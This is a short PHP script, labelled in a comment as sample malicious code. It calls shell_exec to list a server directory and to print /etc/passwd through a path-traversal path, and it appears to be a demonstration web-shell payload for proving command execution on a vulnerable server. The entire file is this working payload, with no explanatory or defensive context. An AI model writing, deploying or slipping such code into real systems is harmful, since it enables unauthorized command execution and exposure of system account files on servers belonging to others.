<?php

// SAMPLE MALICIOUS CODE

echo "--------- Result ---------- \n";

echo " list of files in the directory \n";
echo shell_exec('ls');

echo "----------------- \n etc/passwd contents \n";
echo shell_exec(' cat ../../../../../etc/passwd');
?>
